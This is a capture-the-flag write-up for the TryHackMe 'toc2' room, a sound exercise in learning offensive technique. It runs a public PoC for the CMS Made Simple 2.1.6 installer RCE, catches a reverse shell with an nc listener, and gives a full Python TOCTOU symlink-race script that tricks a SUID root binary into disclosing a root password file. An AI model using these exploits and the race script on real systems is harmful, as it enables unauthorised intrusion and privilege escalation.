# toc2

It's a setup... Can you get the flags in time? 

room: https://tryhackme.com/room/toc2

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/toc2.md

-----------

## Overview

This room involved:

- Web enumeration
- Exposed CMS Made Simple installer
- CMSMS 2.1.6 installer RCE
- Reverse shell as `www-data`
- SUID binary analysis
- TOCTOU race condition privilege escalation

> Public notes: obfuscate full flags and passwords before publishing.

---

## 1. Nmap Enumeration

Run a full TCP scan with service/script detection:

```bash
sudo nmap -sV -sC -p- --min-rate 5000 -oN nmap-sv-all.txt <TARGET_IP>
````

Result:

```text
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41
```

The HTTP title showed:

```text
Site Maintenance
```

Nmap also found a useful `robots.txt` entry:

```text
Disallow: /cmsms/cmsms-2.1.6-install.php
```

---

## 2. Web Enumeration

Opening the website showed an under-construction page.

The page leaked database credentials for the CMS setup:

```text
cmsmsuser:devp***
```

The `robots.txt` file also leaked the database name:

```text
cmsmsdb
```

Important path:

```text
/cmsms/cmsms-2.1.6-install.php
```

This pointed to an unfinished **CMS Made Simple 2.1.6** installation.

---

## 3. CMS Made Simple Installer RCE

CMS Made Simple 2.1.6 has a known installer RCE:

```text
CVE-2018-7448
Exploit-DB: 44192
```

Instead of doing the Burp method manually, we used the GitHub PoC.

Clone the PoC:

```bash
git clone https://github.com/b1d0ws/exploit-cve-2018-7448.git
cd exploit-cve-2018-7448
```

Run it with the target CMSMS path and leaked database credentials:

```bash
python3 exploit-CVE-2018-7448.py \
  -t <TARGET_IP>/cmsms \
  -d cmsmsdb \
  -u cmsmsuser \
  -p '<LEAKED_DB_PASSWORD>'
```

The PoC detected that CMSMS was not installed and abused the installer.

It then presented a webshell menu:

```text
======= WEBSHELL MENU =======
[ 1 ] - Get a Reverse Shell
[ 2 ] - Execute Command
[ 3 ] - Exit
```

Start a listener:

```bash
nc -lvnp 4444
```

Then choose:

```text
1 - Get a Reverse Shell
```

Use your AttackBox IP and listener port.

We selected the Python3 reverse shell option and received a shell as:

```text
www-data
```

---

## 4. Stabilise Shell

Once the shell connected:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Optional local terminal upgrade:

```bash
# Press Ctrl+Z
stty raw -echo; fg
# Press Enter once
```

Check identity:

```bash
id
whoami
hostname
```

---

## 5. Local Enumeration

Check users:

```bash
cat /etc/passwd | grep -E '/bin/bash|/bin/sh'
ls -la /home
```

A user named `frank` existed.

Inside Frank’s home directory, we found an interesting directory:

```bash
cd /home/frank/root_access
ls -la
```

Files:

```text
readcreds
readcreds.c
root_password_backup
```

Permissions:

```text
-rwsr-xr-x 1 root root readcreds
-rw------- 1 root root root_password_backup
```

The `readcreds` binary had the SUID bit set and was owned by root.

---

## 6. Analysing readcreds

Source code:

```c
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>

int main(int argc, char* argv[]) {
    int file_data; char buffer[256]; int size = 0;

    if(argc != 2) {
        printf("Binary to output the contents of credentials file \n ./readcreds [file] \n"); 
        exit(1);
    }

    if (!access(argv[1],R_OK)) {
        sleep(1);
        file_data = open(argv[1], O_RDONLY);
    } else {
        fprintf(stderr, "Cannot open %s \n", argv[1]);
        exit(1);
    }

    do {
        size = read(file_data, buffer, 256);
        write(1, buffer, size);
    } 
    
    while(size>0);
}
```

The vulnerable logic is:

```c
if (!access(argv[1],R_OK)) {
    sleep(1);
    file_data = open(argv[1], O_RDONLY);
}
```

This is a classic **TOCTOU** bug:

```text
Time Of Check → access()
Time Of Use   → open()
```

`access()` checks whether the real user can read the file.

Then the program sleeps for one second.

Then `open()` runs with the binary’s effective privileges because the binary is SUID root.

So the plan is:

```text
1. Point a symlink at a readable file.
2. Let access() pass.
3. During the sleep, swap the symlink to the root-only file.
4. open() reads the root-only file as effective root.
```

---

## 7. Working TOCTOU Python Script

Using `/tmp` can fail because of sticky-bit and protected symlink behaviour, so we used a writable web directory instead:

```bash
mkdir -p /var/www/html/cmsms/race
cd /var/www/html/cmsms/race
```

Create the Python script:

```bash
cat > race.py <<'PY'
#!/usr/bin/env python3
import os
import subprocess
import time

BASE = "/var/www/html/cmsms/race"
OKFILE = os.path.join(BASE, "okfile")
RACEFILE = os.path.join(BASE, "racefile")

READCREDS = "/home/frank/root_access/readcreds"
TARGET = "/home/frank/root_access/root_password_backup"

delay = 0.05
step = 0.05
max_delay = 1.20
increase_every = 20
tries = 0

os.makedirs(BASE, exist_ok=True)

with open(OKFILE, "w") as f:
    f.write("test\n")

os.chmod(OKFILE, 0o644)

def link_to(path):
    try:
        os.unlink(RACEFILE)
    except FileNotFoundError:
        pass
    os.symlink(path, RACEFILE)

print("[*] Starting TOCTOU race")
print(f"[*] Readable file: {OKFILE}")
print(f"[*] Target file:   {TARGET}")

while True:
    tries += 1

    link_to(OKFILE)

    proc = subprocess.Popen(
        [READCREDS, RACEFILE],
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        text=True
    )

    time.sleep(delay)

    link_to(TARGET)

    out, _ = proc.communicate()
    out = out.strip()

    if out and out != "test":
        print()
        print(f"[+] HIT after {tries} tries at delay {delay:.2f}")
        print(out)
        break

    if tries % increase_every == 0:
        delay += step

        if delay > max_delay:
            delay = 0.05

        print(f"[*] Trying delay: {delay:.2f} seconds")
PY

chmod +x race.py
```

Run it:

```bash
python3 race.py
```

Successful output:

```text
[+] HIT after <tries> tries at delay 0.05
Root Credentials: root:aloe****
```

In our run, it hit very quickly at `0.05`.

---

## 8. Become Root

Upgrade the shell if needed:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Switch to root:

```bash
su root
```

Use the recovered root password.

Confirm root:

```bash
id
whoami
```

---

## 9. Root Flag

Read the root flag:

```bash
cd /root
cat root.txt
```

Flag:

```text
thm{7265************}
```

The hex inside the flag decodes to:

```text
reallife
```

---

## Summary

The path was:

```text
Nmap
→ HTTP on port 80
→ Maintenance page leaked CMSMS database credentials
→ robots.txt leaked CMSMS installer path and database name
→ CMS Made Simple 2.1.6 installer RCE
→ Reverse shell as www-data
→ Found SUID readcreds binary in frank's home
→ Source code revealed TOCTOU bug
→ Python symlink race read root_password_backup
→ su root
→ root.txt
```

---

## Key Takeaways

* Always check `robots.txt`.
* Unfinished installers are dangerous.
* CMSMS 2.1.6 installer RCE requires valid database credentials.
* SUID binaries should never use `access()` followed later by `open()`.
* `sleep()` between permission check and file use makes race conditions much easier to exploit.
* Avoid `/tmp` for symlink races on modern Linux; protected symlink settings can interfere.

